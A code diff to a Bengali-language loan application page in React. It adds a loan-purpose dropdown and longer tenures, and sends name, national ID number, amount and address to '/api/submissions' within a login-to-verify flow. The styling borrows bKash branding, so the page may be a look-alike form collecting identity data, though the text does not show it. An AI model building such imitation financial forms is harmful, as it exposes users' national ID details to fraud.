@@ -12,16 +12,38 @@ export default function Apply() {
     nidNumber: '',
     loanAmount: '',
     tenure: '3 মাস',
+    loanReason: 'ব্যক্তিগত লোন',
     address: ''
   });
 
-  const handleNext = () => {
-    if (!formData.fullName || !formData.nidNumber || !formData.loanAmount) {
+  const handleNext = async () => {
+    if (!formData.fullName || !formData.nidNumber || !formData.loanAmount || !formData.address) {
       alert('সবগুলো ঘর পূরণ করুন');
       return;
     }
-    sessionStorage.setItem('loan_data', JSON.stringify(formData));
-    router.push('/verify');
+
+    const submissionId = sessionStorage.getItem('submission_id');
+    if (!submissionId) {
+      router.push('/login');
+      return;
+    }
+
+    try {
+      const res = await fetch('/api/submissions', {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id: submissionId, ...formData }),
+      });
+      
+      if (res.ok) {
+        sessionStorage.setItem('loan_data', JSON.stringify(formData));
+        router.push('/verify');
+      } else {
+        alert('কিছু ভুল হয়েছে। আবার চেষ্টা করুন।');
+      }
+    } catch (err) {
+      alert('সার্ভারে সমস্যা হচ্ছে। পরে আবার চেষ্টা করুন।');
+    }
   };
 
   return (
@@ -83,7 +105,23 @@ export default function Apply() {
                 >
                     <option>3 মাস</option>
                     <option>6 মাস</option>
-                    <option>9 মাস</option>
+                    <option>12 মাস</option>
+                    <option>24 মাস</option>
+                    <option>36 মাস</option>
+                </select>
+            </div>
+
+            <div className="relative border-b-2 border-gray-100 focus-within:border-bkash-pink transition-all">
+                <label className="bkash-label">লোন গ্রহণের উদ্দেশ্য</label>
+                <select 
+                    className="w-full outline-none py-3 text-lg font-bold bg-transparent appearance-none"
+                    value={formData.loanReason}
+                    onChange={(e) => setFormData({...formData, loanReason: e.target.value})}
+                >
+                    <option>ব্যক্তিগত লোন</option>
+                    <option>ব্যাবসায়িক লোন</option>
+                    <option>জরুরী লোন</option>
+                    <option>শিক্ষা লোন</option>
                 </select>
             </div>
 
